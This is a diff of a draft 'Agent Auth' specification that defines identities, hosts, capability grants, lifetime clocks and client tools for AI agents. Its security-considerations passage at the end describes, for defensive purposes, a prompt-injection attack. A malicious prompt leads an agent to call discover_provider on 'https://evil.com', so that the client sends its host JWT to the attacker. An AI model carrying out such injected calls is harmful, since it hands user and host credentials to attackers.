@@ -17,23 +17,21 @@ This document is an implementation-oriented working draft. It is designed to be 
 
 AI agents are becoming long-lived actors: copilots, background workers, scheduled automations, and multi-step systems that call external services without constant human supervision. To operate safely, a service needs to recognize the agent itself as a principal, whether the agent is acting on behalf of a user (`delegated`) or operating on its own (`autonomous`).
 
-Today, most agent integrations reuse a user's OAuth token or a shared client credential. That collapses the runtime agent into someone else's identity and creates three problems:
+Today, most agent integrations reuse a user's OAuth token or a shared client credential. That collapses the runtime agent into someone else's identity and creates various problems:
 
 1. **No visibility.** The server can't tell which agent made a request. There's no audit trail per agent — every call looks like it came from the same OAuth client.
-2. **No scoping.** Every agent gets the user's full permissions or the client's permissions. You can't give one agent read-only access and another full access.
-3. **No isolation.** You can't revoke one agent without revoking all of them. One compromised agent means rotating credentials for everything.
+2. **No scoping.** Every agent gets the user's full permissions or the client's permissions. You can't give one agent read-only access and another agent write access for a specific time period.
+3. **No isolation.** You can't revoke one agent without revoking all of them. A compromised agent means rotating credentials for everything.
 
-This gap is especially acute for autonomous agents. They may discover capabilities, request access, run on schedules, escalate permissions mid-task, or later connect to a user account. Existing user-and-app auth models do not cleanly represent that lifecycle, because they model the human user and the application, but not the runtime agent in between.
+This gap is especially acute for **autonomous agents**(§2.2.2). Existing models tightly couple the human user and the application, forcing agents to pretend to be human users by opening a browser, solving a CAPTCHA, and clicking through a signup flow just to use a service.
+
+As we enter the age of AI agents, we need a secure, reliable, and scalable way to reason about the agent itself without forcing it through a convoluted, cumbersome process of pretending to be, or impersonating, a human user.
 
 ### 1.2 Solution
 
-Agent Auth makes the runtime agent a first-class principal. Instead of borrowing a user's session or a shared application token, each agent gets its own identity, its own granted capabilities, and its own lifecycle. That gives the server something existing auth models are missing: a durable way to reason about which specific agent is acting, what it is allowed to do, and how to suspend, expire, or revoke it without affecting everything else.
+Agent Auth makes the runtime agent a first-class principal. Instead of borrowing a user's session or a shared application token, each agent is registered with its own identity, granted capabilities, and lifecycle. Every agent is created under a persistent identity called a **host** (§3.1), which the **client**(§7) registers with each server it connects to.
 
-A **client** (an MCP server, a CLI tool, an SDK) sits between the AI and the server. It holds a persistent identity called a **host** — a keypair that the client registers with each server it connects to. AI tools like Claude Code, ChatGPT, or any LLM harness connect through a client.
-
-When the AI needs to act, the client creates an **agent** — a session-scoped identity with its own Ed25519 keypair, its own granted capabilities, and its own lifecycle. An agent is not the AI tool itself; it is a specific session, background job, or pipeline run. The client registers many agents under the same host over time.
-
-Each agent authenticates with short-lived signed JWTs. The server can trace every call back to the specific agent, the host it was registered under, what mode it runs in, and which capabilities it holds.
+When the agent needs to act, it authenticates with short-lived signed JWTs tied to that registration. This gives the server something existing auth models are missing: a durable way to identify which specific agent is acting, which host it belongs to, what mode it runs in, what capabilities it holds, and how to suspend, expire, or revoke it without affecting everything else.
 
 ### 1.3 Conformance
 
@@ -65,23 +63,24 @@ The key words "MUST", "MUST NOT", "REQUIRED", "SHALL", "SHALL NOT", "SHOULD", "S
 
 The protocol defines three runtime participants and two identity types:
 
-| Kind | Name | Role |
-|---|---|---|
-| Participant | **Agent** | The AI that needs to act. Has an agent ID and calls client tools. |
-| Participant | **Client** | The process that exposes protocol tools to AI systems (MCP server, CLI, SDK). Holds a host identity, manages keys, and signs requests. |
-| Participant | **Server** | The service's authorization server. Manages registrations, capabilities, approvals, and verification. |
-| Identity type | **Host** | The client's persistent identity on a server: a keypair plus metadata. The server associates default capabilities, trust, and optionally a linked user with it. |
-| Identity type | **Agent** | A per-agent identity used for authenticated capability execution after registration. |
+**Runtime participants**
+
+| Name | Role |
+|---|---|
+| **Agent** | The AI that needs to act. Has an agent ID and calls client tools. |
+| **Client** | The process that exposes protocol tools to AI systems (MCP server, CLI, SDK). Holds a host identity, manages keys, and signs requests. |
+| **Server** | The service's authorization server. Manages registrations, capabilities, approvals, and verification. |
+
+**Identity types**
+
+| Name | Role |
+|---|---|
+| **Host** | The client's persistent identity on a server: a keypair plus metadata. The server associates default capabilities, trust, and optionally a linked user with it. |
+| **Agent** | A per-agent identity used for authenticated capability execution after registration. |
 
 The host is an identity record and credential set, not a running process. A client uses a host identity when registering agents, checking status, or performing host-authenticated operations.
 
-In practice, a host is usually backed by a keypair whose private key is available to the client. The client uses that key to sign host-authenticated JWTs. The server stores or resolves only the corresponding public key.
-
-On each server, the host's public key identifies the host. The server MAY associate default capabilities and a linked user with that host. When a client signs a registration request with the host's private key, the server recognizes the host and can auto-approve delegated agents within that host's default capability set when the host is already linked to a user.
-
-Public keys for both hosts and agents can be provided to servers in two ways:
-- **Inline (JWK)** — sent directly during registration. Simplest case.
-- **JWKS URL** — published at a URL the server can fetch. The URL MAY be served by the client itself, or by a service acting on the client's behalf (for example a broker or identity service). This is useful for key rotation and for avoiding manual public-key distribution across multiple verifier services. The private keys still live with the client or the service that controls that identity.
+Each agent is created under a host. This lets the server reason separately about the persistent client identity (`host`) and the runtime actor (`agent`). The details of host establishment, linking, and key distribution are defined in §3 and §5.
 
 ### 1.6 Protocol Flow
 
@@ -102,28 +101,19 @@ Public keys for both hosts and agents can be provided to servers in two ways:
                                   +----------->|     Owner     |
                                   |<-----------| Approval      |
                                   |            |    (User)     |
-                                  |            +---------------+
-                                  |
-     +-------+          +--------+
-     |       |-(F)----->|        |
-     | Agent | sign_jwt | Client |
-     |       |<-(G)-----|        |
-     +-------+ JWT      +--------+
-
-     +-------+                                +---------------+
-     |       |-(H)--- Signed Agent JWT ------>|   Resource    |
-     | Agent |                                |    Server     |
-     |       |<-(K)-- Protected Resource -----|               |
-     +-------+                                +------+--------+
-                                                     |
-                                                (I) introspect
-                                                  (agent JWT)
-                                                     |
-                                              +------+--------+
-                                              | Authorization |
-                                         (J)  |    Server     |
-                                              | active/grants |
-                                              +---------------+
+                                 |            +---------------+
+                                 |
+     +-------+          +--------+            +---------------+
+     |       |-(F)----->|        |-(G)------->| Authorization |
+     | Agent | execute  | Client | POST       |    Server     |
+     |       | capability|       | /capability|               |
+     +-------+<-(J)-----|        | /execute   |               |
+                result   +--------+<-(I)------|               |
+                                   result     +---------------+
+                                      |
+                                 (H) validate JWT,
+                                     check grants,
+                                     execute capability
 
               Figure 1: Agent Auth Abstract Protocol Flow
 ```
@@ -133,39 +123,41 @@ Public keys for both hosts and agents can be provided to servers in two ways:
 - **(C)** Authorization server returns agent ID and capability grants — either active (auto-approved) or pending (approval required).
 - **(D)** If pending, the resource owner (user) approves via device authorization ([RFC 8628](https://datatracker.ietf.org/doc/html/rfc8628)) or [CIBA](https://openid.net/specs/openid-client-initiated-backchannel-authentication-core-1_0.html). The client facilitates the approval flow and polls for completion.
 - **(E)** Client returns agent ID and granted capabilities to the agent.
-- **(F)** Agent requests a signed JWT from the client (`sign_jwt`).
-- **(G)** Client signs a short-lived agent JWT (§5.3) with the agent's private key and returns it.
-- **(H)** Agent presents the signed JWT to the resource server.
-- **(I)** Resource server calls the authorization server's introspect endpoint (§6.12) with the agent JWT.
-- **(J)** Authorization server validates the JWT and returns the agent's status and granted capabilities.
-- **(K)** Resource server checks the introspection response and returns the protected resource.
+- **(F)** Agent calls `execute_capability` (§7.10) on the client with a capability name and arguments.
+- **(G)** Client sends `POST /capability/execute` (§6.11) to the authorization server, authenticated with a short-lived signed agent JWT.
+- **(H)** Authorization server validates the JWT, checks the agent's granted capabilities, and executes the requested capability.
+- **(I)** Authorization server returns the execution result to the client.
+- **(J)** Client returns the result to the agent.
 
-Resource servers that are co-located with the authorization server MAY verify the JWT directly instead of calling introspect (steps I–J).
+Agents that need a raw JWT for direct server-to-server use can still call `sign_jwt` (§7.5). Resource servers that validate agent JWTs directly MAY use introspection (§6.12) or local verification as described later in the spec, but that is an alternative path rather than the standard capability-execution flow shown above.
 
 **Notes:**
 
-- **Discovery is a pre-step for generic clients.** Multi-provider clients MAY call `list_providers` (§7.1.1), `search_providers` (§7.1.2), and `discover_provider` (§7.1.3) before step (A). Single-service clients skip discovery.
-- **Capabilities are executed through a standard endpoint.** The agent calls `execute_capability` (§7.9), which sends the capability name and arguments to `POST /capability/execute` (§6.11). The server validates the agent JWT, executes the capability, and returns the result.
-- **Capability escalation.** An active agent that needs additional capabilities calls `request_capability` (§7.5), which may trigger another approval flow (D) for the new capabilities.
-- **Reactivation.** An expired agent can be reactivated via `reactivate_agent` (§7.7), which calls `POST /agent/reactivate` (§6.6). Capabilities decay to host defaults; escalated capabilities must be re-requested.
-
-Detailed use case flows with sequence diagrams are in Appendix A.
+- **Discovery is a pre-step for generic clients.** Multi-provider clients MAY call `list_providers` (§7.2.1), `search_providers` (§7.2.2), and `discover_provider` (§7.2.3) before step (A). 
 
 ## 2. Agent
 
 ### 2.1 What is an Agent
 
-An agent is a runtime AI actor that needs to call external services. Each agent has its own server-side `agent_id`, its own keypair, its own granted capabilities, and its own lifecycle. Agents are registered under hosts (§3) and authenticate with short-lived signed JWTs (§5.3).
+An agent is a runtime AI actor that needs to call external services. Each agent has its own server-side identity, its own granted capabilities, and its own lifecycle. Agents are registered under hosts (§3) and authenticate with short-lived signed JWTs (§5.3).
 
 ### 2.2 Modes
 
 An agent operates in one of two modes, which determines its relationship to a user. The mode is chosen at registration and cannot be changed after creation.
 
-**Delegated mode** (`"delegated"`, default) — the agent acts on behalf of a specific user. The user sees what the agent is requesting and decides what to allow. This is the common case: a user's copilot, assistant, or tool-calling agent.
+#### 2.2.1 Delegated Agents
 
-**Autonomous mode** (`"autonomous"`) — the agent operates without a user in the loop. Capabilities are granted by server policy or administrator approval, not by an end user. Use cases include background workers, scheduled automations, service-to-service agents, and agents that bootstrap before any user interaction. If the agent is later claimed by a user, it transitions to `"claimed"` state (§3.4).
+In delegated mode (`"delegated"`, default), the agent acts on behalf of a specific user. The user sees what the agent is requesting and decides what to allow. This is the common case: a user's copilot, assistant, or tool-calling agent.
 
-How each mode affects registration and host linking is covered in §3 (Hosts) and §7.3 (`connect_agent`). Servers advertise which modes they support via discovery (§6.1) and MUST reject registration requests with an unsupported mode.
+**Example.** An email assistant that requests permission to read your inbox and send replies on your behalf.
+
+#### 2.2.2 Autonomous Agents
+
+In autonomous mode (`"autonomous"`), the agent operates without a user in the loop. Capabilities are granted by server policy or administrator approval, not by an end user. Use cases include background workers, scheduled automations, service-to-service agents, and agents that bootstrap before any user interaction. If the agent is later claimed by a user, it transitions to `"claimed"` state (§3.4).
+
+**Example.** A deployment agent that signs up for an infrastructure API, provisions resources, and deploys a website without waiting for a user to approve each step.
+
+A server MAY support delegated agents, autonomous agents, or both. Servers advertise supported modes via discovery (§6.1) and MUST reject registration requests for any unsupported mode.
 
 ### 2.3 States
 
@@ -182,17 +174,13 @@ Every agent is in exactly one state at any time. Only `active` agents can authen
 
 ### 2.4 Lifetime Clocks
 
-Three independent clocks govern agent lifetimes. The durations are server policy — the server MAY vary them per agent based on mode, host, capabilities, or any other criteria. The agent only sees the computed `expires_at` in responses.
+Three independent clocks govern agent lifetimes. The durations are server policy — the server MAY vary them per agent based on mode, host, capabilities, or any other criteria.
 
-| Clock | Measured From | Resets On Reactivation | Effect When Elapsed |
-|---|---|---|---|
-| Session TTL | last request | Yes | → expired (idle timeout) |
-| Max lifetime | last activation | Yes | → expired (caps active sessions) |
-| Absolute lifetime | agent creation | Never | → revoked (permanent death) |
+- **Session TTL** protects against abandoned agents. It is measured from the last request. If the agent stops making requests, it becomes `expired`.
+- **Max lifetime** caps continuous use. It is measured from the last activation. Even if the agent remains active, once this duration elapses it becomes `expired` and must be re-authorized. This prevents compromised agents from running indefinitely.
+- **Absolute lifetime** is a hard cap from creation. Once elapsed, the agent becomes `revoked` permanently — it cannot be reactivated. A new agent must be created.
 
-- **Session TTL** protects against abandoned agents. If the agent stops making requests, it expires.
-- **Max lifetime** caps continuous use. Even if the agent is active, after this duration it must be re-authorized. This prevents compromised agents from running indefinitely.
-- **Absolute lifetime** is a hard cap from creation. Once elapsed, the agent is permanently revoked — it cannot be reactivated. A new agent must be created.
+**Example:** Suppose a server uses a 30-minute session TTL, a 24-hour max lifetime, and a 7-day absolute lifetime. If the agent stops making requests for 30 minutes, it becomes `expired`. If it stays continuously active for 24 hours, it also becomes `expired` and must be reactivated. Once 7 days have passed since creation, it becomes `revoked` permanently and cannot be reactivated.
 
 ### 2.5 Reactivation
 
@@ -210,22 +198,24 @@ An agent can be revoked by:
 - **The owning user** — through the server's management UI or API
 - **An admin** — as defined by the server
 
-Revocation is permanent — a revoked agent cannot be reactivated. The specific endpoints and mechanisms are defined in §6.7 and §7.6. Host revocation and its effect on agents is covered in §3.
+Revocation is permanent — a revoked agent cannot be reactivated. The specific endpoints and mechanisms are defined in §6.7 and §7.7. Host revocation and its effect on agents is covered in §3.
 
 ## 3. Host
 
 ### 3.1 What is a Host
 
-A host is the client's persistent identity on a server: a registered keypair plus metadata. Every agent is registered under a host. A host MAY exist without any linked user (unlinked host) or be linked to at most one user (linked host). Hosts carry default capabilities — agents registered under them can be granted these capabilities without additional approval.
+A host is the persistent identity of the client environment where agents run. Conceptually, it represents the place the agent is running from: for example, a local Claude Code session on your laptop, a Cursor installation on your desktop, a ChatGPT connector runtime, a background worker, or any other client that manages agents and talks to servers. On the server, that environment is represented as a registered keypair plus metadata.
+
+Every agent is registered under a host. This lets the server reason about the long-lived client environment (`host`) separately from the individual runtime agent (`agent`). A host MAY exist without any linked user (unlinked host) or be linked to at most one user (linked host). Hosts carry default capabilities — agents registered under them can be granted these capabilities without additional approval.
 
 ### 3.2 Host Establishment
 
 Hosts are established in one of two ways:
 
 1. **Dynamic registration** — the host is first seen as part of agent registration (§6.3). If the host is unknown, the server creates it in `pending` state and waits for user approval.
-2. **Pre-registration** — the host is registered before any agent exists. The user provides the host's public key directly via the server's dashboard, admin API, or any other server-specific mechanism.
+2. **Pre-registration** — the host is registered before any agent exists. A user or administrator pre-registers the host through the server's dashboard, admin API, or any other server-specific mechanism.
 
-In both cases, the result is the same host record: a host keypair (or JWKS URL), an optional linked user, and a set of default capabilities for delegated agents. A host without a linked user MAY provision autonomous agents.
+In both cases, the result is the same host record: a host keypair (or JWKS URL), an optional linked user, and a set of default capabilities. A host without a linked user MAY provision autonomous agents.
 
 ### 3.3 Host Linking
 
@@ -316,7 +306,7 @@ The same capability name can appear in different parts of the protocol for diffe
 
 ### 4.1 Execution
 
-The standard way to execute a capability is through `POST /capability/execute` (§6.11). The agent calls the client's `execute_capability` tool (§7.9) with a `capability` and `arguments`. The client signs an agent JWT and forwards the request to the server. The server validates the JWT, checks that the agent has been granted the capability, executes it, and returns the result.
+The standard way to execute a capability is through `POST /capability/execute` (§6.11). The agent calls the client's `execute_capability` tool (§7.10) with a `capability` and `arguments`. The client signs an agent JWT and forwards the request to the server. The server validates the JWT, checks that the agent has been granted the capability, executes it, and returns the result.
 
 This model has a key advantage for adoption: the server acts as a gateway. A service with an existing REST API, GraphQL endpoint, or any other backend can add Agent Auth by deploying the auth server as a proxy — there is no need to add JWT validation to every service endpoint. The auth server handles identity, authorization, and audit in one place, then calls the backend on the agent's behalf.
 
@@ -366,6 +356,11 @@ Both hosts and agents use Ed25519 keypairs in JWK format.
 - The private key MUST never be sent to the server
 - The server stores only public keys (or JWKS URLs)
 - The agent's private key lives with the client
+
+Public keys for both hosts and agents can be provided to servers in two ways:
+
+- **Inline (JWK)** — sent directly during registration. Simplest case.
+- **JWKS URL** — published at a URL the server can fetch. The URL MAY be served by the client itself, or by a service acting on the client's behalf (for example a broker or identity service). This is useful for key rotation and for avoiding manual public-key distribution across multiple verifier services. The private keys still live with the client or the service that controls that identity.
 
 The `algorithms` field in discovery (§6.1) lists what the server accepts for new registrations. Removing an algorithm from the list MUST NOT invalidate existing agents or hosts that registered with it.
 
@@ -1361,21 +1356,23 @@ WWW-Authenticate: AgentAuth discovery="https://auth.example.com/.well-known/agen
 - Clients that receive an `AgentAuth` challenge SHOULD fetch the discovery URL if no active agent exists for that server, then proceed through registration (§6.3) before retrying the original request.
 - If the agent JWT is present but the agent lacks the required capability, the resource server SHOULD return `403` with the `capability_not_granted` error code (§6.13) instead of a `401` challenge.
 
-This mechanism is OPTIONAL. Agents SHOULD prefer proactive discovery via `/.well-known/agent-configuration` or registry search (`search_providers`, §7.1.2) when possible. The challenge header exists as a fallback for cases where the agent has no prior knowledge of the service's auth configuration.
+This mechanism is OPTIONAL. Agents SHOULD prefer proactive discovery via `/.well-known/agent-configuration` or registry search (`search_providers`, §7.2.2) when possible. The challenge header exists as a fallback for cases where the agent has no prior knowledge of the service's auth configuration.
 
 ## 7. Client
+
+### 7.1 What is a Client
 
 The client sits between the agent and the server. It manages host and agent keys, communicates with servers, and exposes a standard set of tools that agents call to discover, register, authenticate, and execute capabilities. A client can be an MCP server, a CLI, an SDK, or any process that implements these tools.
 
 The protocol does not define how agents communicate with clients. A client may run in the same process or machine as the agent (e.g. a local MCP server, an embedded SDK) — in this case the agent calls tools directly with no authentication required. Alternatively, a client may be a remote service that the agent reaches over a network, in which case the agent-to-client channel requires its own authentication (OAuth, API keys, session tokens, or whatever the transport provides). This is outside the scope of this protocol.
 
-### 7.1 Discovering Providers
+### 7.2 Discovering Providers
 
 Before an agent can connect, it may need to determine which provider to use. Clients MAY expose provider-discovery tools for this purpose. `list_providers` returns providers the client already has available, `search_providers` finds providers by intent through a registry, and `discover_provider` resolves a specific provider from a direct URL.
 
 Clients that are designed for a single service MAY omit some or all of these tools. In that case, the provider is implicit in the client itself and the agent can proceed directly to capability listing or connection.
 
-#### 7.1.1 list_providers
+#### 7.2.1 list_providers
 
 Returns the providers currently available through the client. For multi-provider clients, this is typically the first tool an agent calls to see which services are available.
 
@@ -1393,7 +1390,7 @@ Single-provider clients MAY omit this tool since the agent already knows the pro
 ]
 ```
 
-#### 7.1.2 search_providers
+#### 7.2.2 search_providers
 
 Searches a registry for providers matching a natural language intent. Clients that do not support registry lookup MAY omit this tool.
 
@@ -1403,7 +1400,7 @@ Searches a registry for providers matching a natural language intent. Clients th
 
 **Behavior:**
 
-1. Query a registry (§7.10) to find matching services.
+1. Query a registry (§7.11) to find matching services.
 2. Return matching providers for the agent to choose from.
 
 **Response shape:**
@@ -1418,7 +1415,7 @@ Searches a registry for providers matching a natural language intent. Clients th
 ]
 ```
 
-#### 7.1.3 discover_provider
+#### 7.2.3 discover_provider
 
 Fetches a provider's discovery document from a direct service URL. Clients SHOULD require user confirmation or check against an allowlist before fetching arbitrary URLs. Clients that are pre-configured for specific services MAY omit this tool.
 
@@ -1441,9 +1438,9 @@ Fetches a provider's discovery document from a direct service URL. Clients SHOUL
 }
 ```
 
-### 7.2 list_capabilities
+### 7.3 list_capabilities
 
-Returns a lightweight listing of available capabilities — names, descriptions, and grant status. All parameters are optional — a bare `list_capabilities()` returns everything the server offers. For full capability details including input schemas, use `describe_capability` (§7.2.1).
+Returns a lightweight listing of available capabilities — names, descriptions, and grant status. All parameters are optional — a bare `list_capabilities()` returns everything the server offers. For full capability details including input schemas, use `describe_capability` (§7.3.1).
 
 **Input:**
 
@@ -1478,7 +1475,7 @@ Returns a lightweight listing of available capabilities — names, descriptions,
 
 The `grant_status` field is present when the request is authenticated with an agent JWT. It indicates whether the agent has already been granted this capability.
 
-### 7.2.1 describe_capability
+### 7.3.1 describe_capability
 
 Returns the full detail for a single capability, including its `input` schema. Agents call this when they need to know a capability's input shape before executing it, or to re-fetch details that are no longer in context.
 
@@ -1514,9 +1511,11 @@ Returns the full detail for a single capability, including its `input` schema. A
 
 If the capability does not exist, the client SHOULD return an error indicating the name was not found.
 
-### 7.3 connect_agent
+### 7.4 connect_agent
 
 Connects an agent to a service. This generates a keypair, registers the agent on the server, handles any required approval, and stores the connection locally. The agent gets its own identity, keypair, and set of granted capabilities.
+
+Mode choice matters at registration time. A server MAY support delegated agents, autonomous agents, or both. Servers advertise which modes they support via discovery (§6.1) and MUST reject registration requests for any unsupported mode. How mode affects host linking is covered in §3.
 
 **Input:**
 
@@ -1524,7 +1523,7 @@ Connects an agent to a service. This generates a keypair, registers the agent on
 |---|---|---|---|
 | `provider` | string | Yes | Provider name (from `list_providers`) or service URL |
 | `name` | string | Yes | Human-readable name for the agent. Displayed in dashboards, approval screens, and audit logs. Clients MAY auto-generate this from context if the agent doesn't provide one. |
-| `capabilities` | string[] | No | Capability names to request. If omitted, the agent is created with no capabilities — the agent can request them later via `request_capability` (§7.5). |
+| `capabilities` | string[] | No | Capability names to request. If omitted, the agent is created with no capabilities — the agent can request them later via `request_capability` (§7.6). |
 | `mode` | string | No | `"delegated"` (default) or `"autonomous"` |
 | `reason` | string | No | Human-readable reason for the request. Displayed to the user on the approval screen. |
 | `preferred_method` | string | No | Preferred approval method hint (e.g. `"device_authorization"`, `"ciba"`). Passed through to the server on `POST /agent/register` (§6.3). |
@@ -1541,9 +1540,9 @@ Connects an agent to a service. This generates a keypair, registers the agent on
 6. If `status: "pending"` → initiate the approval flow returned by the server (§9). Poll for status until the agent is approved, rejected, or the approval expires. On approval, store the connection and return agent_id + granted capabilities (including full capability details). On rejection or timeout, report the outcome to the agent.
 7. If the server returns `invalid_capabilities` → return an error to the agent indicating which capability names were not recognized. The client SHOULD include the list of available capabilities (from the most recent `list_capabilities` or `discover_provider` result) so the agent can self-correct without an extra round trip.
 
-### 7.4 sign_jwt
+### 7.5 sign_jwt
 
-Returns a signed agent JWT for authenticating requests. The agent does not hold its own private key — the client does (§5.1). Most agents use `execute_capability` (§7.9) instead of requesting a raw JWT. This tool exists for agents that need direct access to a signed token — for example, to authenticate with resource servers that validate agent JWTs directly.
+Returns a signed agent JWT for authenticating requests. The agent does not hold its own private key — the client does (§5.1). Most agents use `execute_capability` (§7.10) instead of requesting a raw JWT. This tool exists for agents that need direct access to a signed token — for example, to authenticate with resource servers that validate agent JWTs directly.
 
 **Input:**
 
@@ -1569,7 +1568,7 @@ The client MAY refuse to sign (e.g. agent is revoked, rate limit exceeded). The 
 }
 ```
 
-### 7.5 request_capability
+### 7.6 request_capability
 
 Requests additional capabilities for an already-connected agent. This is how an agent escalates beyond its initial grant — for example, an agent that was granted read access now needs write access.
 
@@ -1622,7 +1621,7 @@ Requests additional capabilities for an already-connected agent. This is how an 
 
 As with the server status response (§6.5), active grants include full capability details. Pending and denied grants include only `capability` and `status`.
 
-### 7.6 disconnect_agent
+### 7.7 disconnect_agent
 
 Revokes the agent on the server and removes the stored connection locally. This is permanent — the agent cannot be reactivated after disconnecting.
 
@@ -1639,9 +1638,9 @@ Revokes the agent on the server and removes the stored connection locally. This 
 3. Remove the stored connection data (keypair, config)
 4. Return confirmation
 
-### 7.7 reactivate_agent
+### 7.8 reactivate_agent
 
-Reactivates an expired agent connection. The agent keeps its identity (`agent_id`) and keypair, but its capabilities decay to the host's defaults — any previously escalated capabilities are lost and must be re-requested via `request_capability` (§7.5).
+Reactivates an expired agent connection. The agent keeps its identity (`agent_id`) and keypair, but its capabilities decay to the host's defaults — any previously escalated capabilities are lost and must be re-requested via `request_capability` (§7.6).
 
 **Input:**
 
@@ -1693,7 +1692,7 @@ Reactivates an expired agent connection. The agent keeps its identity (`agent_id
 }
 ```
 
-### 7.8 agent_status
+### 7.9 agent_status
 
 Checks the health and status of an existing agent connection.
 
@@ -1709,7 +1708,7 @@ Checks the health and status of an existing agent connection.
 2. Sign a host JWT and call `GET /agent/status` with `?agent_id=...`
 3. Return agent status, granted capabilities, and connection health
 
-### 7.9 execute_capability
+### 7.10 execute_capability
 
 Executes a granted capability through the server's execute endpoint (§6.11). The client signs an agent JWT and sends the capability name and arguments to `POST /capability/execute`. The server validates the JWT, checks grants, executes the capability, and returns the result.
 
@@ -1729,7 +1728,7 @@ Executes a granted capability through the server's execute endpoint (§6.11). Th
 4. For async responses (`status: "pending"`), poll the `status_url` until completion and return the final result
 
 
-### 7.10 Registry
+### 7.11 Registry
 
 A registry is a searchable index of services that support Agent Auth. It is a client-side discovery aid, not part of the core server protocol — the registry URL is configured on the client.
 
@@ -1965,7 +1964,7 @@ After registration, the agent authenticates independently with its own keypair �
 Discovery of arbitrary URLs is a prompt injection vector. A malicious prompt can trick an agent into calling `discover_provider(url: "https://evil.com")`, which returns a fake configuration. The client then sends the host JWT to the attacker's "register" endpoint.
 
 Mitigations:
-- **Registry-first discovery.** Clients SHOULD resolve new services through a trusted registry (§7.10) using `search_providers` rather than arbitrary URLs.
+- **Registry-first discovery.** Clients SHOULD resolve new services through a trusted registry (§7.11) using `search_providers` rather than arbitrary URLs.
 - **User confirmation.** If `discover_provider` is called with a direct URL, the client SHOULD require user confirmation before fetching the configuration.
 - **Allowlists.** Clients MAY maintain an allowlist of trusted service URLs.
 - **Proof on host-authenticated registration.** For **discovered servers** (not pre-configured), clients SHOULD use DPoP or an equivalent request-specific proof on host-authenticated registration requests so they cannot be replayed to a different endpoint.
